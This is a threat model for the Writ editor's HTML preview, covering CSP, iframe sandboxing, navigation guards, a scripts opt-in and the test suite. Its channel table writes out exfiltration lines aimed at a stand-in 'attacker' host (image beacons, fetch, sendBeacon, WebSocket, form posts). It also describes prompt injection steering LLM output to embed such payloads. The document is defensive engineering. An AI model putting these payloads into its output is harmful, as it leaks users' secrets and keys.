# HTML Preview — Threat Model

**Scope:** the Writ preview surface (ADR-009 lean re-scope; ADR-011 amended by
[ADR-043](../adr/043-untrusted-documents-in-the-preview.md)).
**Status:** current as of U9.

## What the preview is for

The preview renders Markdown, HTML, Mermaid and KaTeX. Since ADR-041 file
associations route any downloaded `.md` or `.html` into it, so a document in the
preview may be **untrusted**, not only Writ's own agent output. It is still not
a browser. Two design facts everything below rests on:

> **A document that is not opted in sends nothing out through any channel below.**
>
> **A document's own scripts are off until the user opts the file in.**

The document CSP shuts the fetch-shaped channels. The iframe sandbox, the app's
`frame-src` and the navigation guard shut navigation. Two kinds of markup are
disarmed before the document is served: the resource hints no CSP directive
governs, and the attributes that start a frame navigation without a script,
whose target Chromium connects to before the policy refuses it. With scripts
off nothing is left to open the channels a script could (ADR-043). There is no pin
store and no audit log: those were designed (ADR-011) for a renderer that could
reach the network. There is a per-file scripts opt-in, kept on the buffer row,
because a downloaded document is not the user's own.

## Assets

- **The user's own content** in the previewed buffer — often sensitive
  prompt data, API keys pasted into a scratch buffer, internal text. This is
  the asset an attacker would want to exfiltrate.
- **The host machine** — the filesystem, clipboard, other Writ buffers.

## Adversary

- **A downloaded document.** File associations route any `.md` or `.html`
  into the preview (ADR-041), so a file built to report that it was opened,
  or to carry out the text of a note it embeds, is shown like any other.
- **Prompt-injected or malicious agent output.** The user previews text an
  LLM produced; that text may have been steered by a prompt-injection
  attack to embed an exfiltration payload (`<img src=https://attacker/?…>`,
  `fetch()`, a tracking pixel, a beacon). The user's threat model is "I'm
  reading what the model wrote."
- The adversary does **not** have local code execution or filesystem
  access. Those are out of scope (an attacker with the user's privileges has
  already won, independent of the preview).

## Exfiltration channels and how each is closed

The boundary has six parts: the **document Content-Security-Policy** attached
as a response header to every document response; the **iframe sandbox**; the
app's **`frame-src`**; the **main-webview navigation guard**; and the
**resource-hint rewrite** and the **frame rewrite** the handler applies to
every document it serves. The locked document policy on macOS and Linux,
scripts-on form:

```
default-src 'none';
script-src 'unsafe-inline' 'self' writ-preview:;
style-src 'unsafe-inline' 'self' writ-preview:;
img-src 'self' writ-preview: data:;
font-src 'self' writ-preview: data:;
media-src 'self' writ-preview: data:;
connect-src 'none'; object-src 'none'; frame-src 'none';
worker-src 'none'; form-action 'none'; base-uri 'none';
frame-ancestors tauri://localhost http://localhost:1420;
navigate-to 'none';
sandbox allow-scripts allow-same-origin
```

On Windows each subresource directive also lists `http://writ-preview.document`,
the document's own origin under WebView2's custom-scheme form, and
`frame-ancestors` names the app as `http://tauri.localhost` and
`https://tauri.localhost`. The scripts-off form drops `'unsafe-inline'` from
`script-src`. The preview iframe carries `sandbox="allow-scripts
allow-same-origin"`. The app's `frame-src` is `writ-preview:` on macOS and
Linux and `http://writ-preview.chrome http://writ-preview.document` on Windows
(`tauri.windows.conf.json`).

| Channel | Vector | Closed by |
|---|---|---|
| Image beacon | `<img src="https://attacker/?secret">` | `img-src` has no remote scheme |
| Scripted fetch | `fetch('https://attacker/', {body: secret})` | `connect-src 'none'` |
| Beacon API | `navigator.sendBeacon('https://attacker/', secret)` | `connect-src 'none'` |
| WebSocket | `new WebSocket('wss://attacker/')` | `connect-src 'none'` |
| Remote font | `@font-face { src: url('https://attacker/?…') }` | `font-src` has no remote scheme |
| Remote stylesheet | `@import url(…)`, `<link rel=stylesheet href=…>` | `style-src` has no remote scheme |
| Resource hint | `<link rel=preconnect\|dns-prefetch\|prefetch\|preload\|prerender href=…>`, also as a second `rel` after a stylesheet's | the hint rewrite, which renames the link's tag whichever `rel` an engine reads, and `X-DNS-Prefetch-Control: off`; no CSP directive governs `preconnect` |
| Top navigation | `top.location = 'https://attacker/?secret'` | iframe sandbox (no `allow-top-navigation`) and the navigation guard |
| Frame navigation | `<meta http-equiv=refresh>`, `location.href` | the frame rewrite renames every `http-equiv` but five inert pragmas before the document is served; the app's `frame-src` (only the preview origins) and, on macOS and Linux, the guard refuse a script's navigation, which on WebView2 connects to its target first (an opted-in file only, see the residual risks) |
| Link click | `<a>`, `<area>` or an SVG link, any `target` | the bridge reports it to the app as a request to open and cancels it; the sandbox and `frame-src` behind it |
| Popup | `window.open(…)`, `target=_blank` | iframe sandbox (no `allow-popups`) |
| Form post | `<form action="https://attacker/">` | iframe sandbox (no `allow-forms`) and `form-action 'none'` |
| Plugin / embed | `<object>`, `<embed>` | `object-src 'none'` |
| Nested frame | `<iframe src=…>`, `<iframe srcdoc=…>`, `<frame src=…>` | the frame rewrite renames every `src` and `srcdoc` on an `iframe` or `frame` before the document is served, since Chromium connects to a refused frame's target and both engines build a `srcdoc` document under `frame-src 'none'`; `frame-src 'none'` refuses a frame a script creates, which on WebView2 connects first (an opted-in file only) |
| `<base>` redirect | `<base href="https://attacker/">` | `base-uri 'none'` |

`navigate-to` is not the control for navigation: no shipping engine implements
it, so it is kept only as defense in depth.

`http:` to a remote host is no more permitted than `https:`; neither appears in
any egress directive. The only non-keyword sources are `data:`, which is
inline, the preview scheme, and on Windows the document's own WebView2 origin.
The preview scheme in both forms is the host's own protocol, which serves only
the bundled chrome assets, the current buffer's rendered HTML, and through the
`_note-asset/` route the images a note embeds, from the folders its render
recorded (see the scope boundary below).

### Scripts are off by default

A document's own scripts are off until the user turns them on for that file
("Preview: Toggle scripts for this file", or the `Scripts off` field the
status bar shows while an HTML or Markdown document is in the preview), kept
on the buffer row with the digest of the bytes the file held (ADR-043). A save
from Writ records the digest of what it wrote. Every render and every read by
the status bar compares the file with the recorded digest, so a change another
program makes turns the scripts off again, whether the tab was open or closed
or Writ was not running, and a preview showing the file reloads. When
off, `script-src` admits only `'self'` and the preview scheme, so the
document's own inline and authored scripts do not run; the first-party
runtimes (the bridge, Mermaid, KaTeX, served same-origin under `_assets/`)
still load, so diagrams and math draw in every note. When a file is opted in,
`script-src` gains `'unsafe-inline'` and the document's scripts run. The CSP,
the sandbox, `frame-src` and the guard still apply, but a script has channels
none of them govern (see the residual risks): an opted-in file is one whose
code the user trusts.

## The `writ-preview://` scope boundary

The protocol has two scopes: `chrome` (host-owned bundled assets: the fallback
stylesheet and the parked blank document) and `document` (the user's rendered
buffer, plus the first-party runtimes served same-origin under its `_assets/`
route). The document scope must never be able to reach the chrome scope. The
parser
(`writ_core::preview::protocol::parse`) refuses any request that, after a
single percent-decode and backslash-normalisation, contains a `..` segment
— so `writ-preview://document/../chrome/x` and its encoded and Windows-slash
variants are refused before any I/O. This is the one boundary the
disposition recorder genuinely observes, and the verification suite asserts
it directly.

## Verification

The boundary is proven in-repo. The unit suites below run in the required CI
checks on every PR that changes code. The engine probe runs there too, as its
own job; it is not a required check until all three of its legs have passed.
The URL parser's fuzz target runs locally with `cargo fuzz` on a nightly
toolchain; no CI job runs it, and the property test below holds its
invariants as a merge gate.

- **A real engine enforcing it: the exfil probe.**
  `src-tauri/tests/engine_probe.rs` builds the shipped topology in a real
  WebKit, WebKit2GTK or WebView2 window: an app-origin page under the app CSP
  the build merges for the platform, framing the preview document with the
  shipped sandbox attribute at the URL the host's base gives, the document
  rendered by the HTML renderer and served through the production handler and
  guard. Every vector aims at its own local TCP sink, STUN at a UDP sink, and
  host names at a DNS sink where the run routes a test domain to it.
  - Scripts off: every static vector in the table above, plus an inline script.
    Asserted: no sink sees anything, the inline script does not run, the bridge
    does, and the app page stays.
  - Scripts on: the document's script tries every navigation and fetch in the
    table. Asserted: none reaches a sink, each link click reaches the app as a
    request to open, and the app page stays. STUN and a preconnect the script
    creates are reported, not asserted, and on Windows so are the frame
    navigations the script starts.
  - Controls: the same iframe, at the same origin and under the same sandbox,
    loads a document served without the policy that fires an image, a
    preconnect and STUN at fresh sinks, and, with the DNS sink on, an image by
    name. The image must land and the name must reach the DNS sink, or silence
    would prove nothing. A page with no policy at `about:blank` fires the same
    set as a diagnostic. On Windows the probe turns off Chromium's private and
    local network checks, which would otherwise stop a loopback sink for a
    reason no remote host meets.

  It runs as the `engine-probe` CI job on macOS, Windows and Linux. It needs a
  display and the main thread, so it runs under `WRIT_ENGINE_PROBE=1` and is a
  no-op in the ordinary unit gate.
- **The policy bytes.** `src-tauri/src/preview/csp.rs` locks the document and
  chrome policies for each platform byte for byte, and
  `src-tauri/tests/app_csp_tests.rs` the app's `frame-src` on each platform and
  that the Windows policy differs from the base in nothing else.
- **The hint rewrite.** `crates/writ-core/tests/preview_resource_hints_tests.rs`
  checks the rewritten output with html5ever's tokenizer started at every `<`,
  counting a link live when its `rel` names a hint or it repeats an attribute
  (Chromium's preload scanner acts on a later `rel`), across the parser
  contexts that change how a `<` reads and a generated set of attribute
  spellings, and checks with a tree builder that a renamed link leaves the rest
  of the document's tree as it was; `src-tauri/tests/preview_security.rs`
  checks that the links the renderers write pass through it unchanged.
- **The frame rewrite.** `crates/writ-core/tests/preview_frame_navigation_tests.rs`
  checks the rewritten output with the same tokenizer, counting a frame live
  while an `iframe` or `frame` keeps a `src` or `srcdoc` and a pragma live
  while a `meta` keeps an `http-equiv` that is not one of the five inert
  pragmas, across the same parser contexts and a generated set of attribute
  spellings; it checks that every copy of a repeated attribute is renamed,
  that the five inert pragmas are kept, that overlapping tags are read in
  linear time, and with a tree builder that only the renamed attribute names
  change. An end tag named `src`, `srcdoc` or `http-equiv` that a tag left open
  in text reads as an attribute keeps its name, and that attribute has no value;
  one with an `=` after its name is renamed.
  `preview_security.rs` checks that the renderers' documents pass through it
  unchanged.
- **Scope/traversal: the disposition recorder.** The same suite drives URLs
  through the real `resolve()` pipeline and asserts the recorded
  disposition: document-to-chrome traversal (plain, encoded, double-encoded,
  backslash), null bytes, and bad encodings are `Refused`; legitimate
  same-scope requests are `Allowed`.
- **The navigation guard.** `src-tauri/src/navigation.rs` tests that the guard
  allows the app origin, the preview scheme and inert `about:` pages, allows
  the WebView2 forms on Windows only, allows the dev server's exact origin
  only under `tauri dev`, and refuses every remote origin, `data:`,
  `javascript:` and lookalike host; `src-tauri/tests/preview_scripts_ipc_tests.rs`
  that it is installed on the app.
- **The scripts opt-in.** `crates/writ-storage/tests/buffer_store_tests.rs`
  checks that an opt-in lapses when another program rewrites the file while its
  tab is closed or while Writ is not running, that a save from Writ keeps it
  and cannot carry it over another program's change, and that a file that
  cannot be read runs nothing; `src-tauri/tests/preview_scripts_external_change_tests.rs`
  drives the same cases through the app's watcher, close, History reopen and
  render.
- **Parser fuzzing.** `fuzz/fuzz_targets/preview_url_parser.rs` fuzzes
  `parse` for "never panics" and "no traversal survives into an accepted
  request." A stable-toolchain property test
  (`crates/writ-core/tests/preview_url_parser_property.rs`) enforces the
  same invariants over the committed seed corpus and a generated adversarial
  bank, so the guarantee is a green merge gate, not only a local fuzz run.

## Residual risks, explicitly accepted

- **An opted-in file can reach the network.** Neither the CSP nor the sandbox
  governs `RTCPeerConnection` STUN, a resource hint a script inserts after the
  document is served, or a link click a script hides from the bridge (WebKit
  connects to a `target=_blank` link's host even when the sandbox refuses the
  popup). On WebView2 a frame navigation the script starts (a frame it
  creates, a refresh it inserts, `location.href`) connects to its target
  before `frame-src` refuses it, which reaches no host an inserted hint cannot.
  Opting a file in is a decision to run its code.
- **First-party runtimes as gadgets.** With scripts off any document can still
  load the bridge, Mermaid and KaTeX through `script-src 'self'`. Mermaid runs
  in strict mode and KaTeX with `trust` off; neither opens a channel the policy
  leaves shut.
- **A person's own click.** The probe's clicks are scripted; a mouse run on
  each platform is a manual check.
- **The opt-in follows the file through Writ's own saves.** A file edited and
  saved in Writ keeps its opt-in, whatever the edit put in it.
- **We trust the webview engine to enforce the attached policy per spec.** A
  CSP- or sandbox-enforcement bypass, a 0-day in WebKit (macOS), WebKit2GTK
  (Linux) or WebView2 (Windows), would defeat the boundary. This is out of
  scope; the mitigation is OS sandboxing and timely engine upgrades. The
  three-engine probe is the standing check that the policy is enforced as
  written.
- **A script that manipulates the visible DOM** (in an opted-in document) can
  mislead the user visually. Phishing-by-rendered-content is not defended
  against beyond the network boundary.
- **Local-filesystem attackers** (an actor with the user's privileges) are
  out of scope, as above.

## Change control

The locked policy bytes are asserted by byte-equality tests
(`src-tauri/src/preview/csp.rs`) and the app's `frame-src` by
`src-tauri/tests/app_csp_tests.rs`. Any change to them is a deliberate security
decision and fails those tests until updated; that failure is the gate that
makes the decision a conscious one. The engine probe then shows, on every PR
that changes code, that the engines enforce the new bytes.
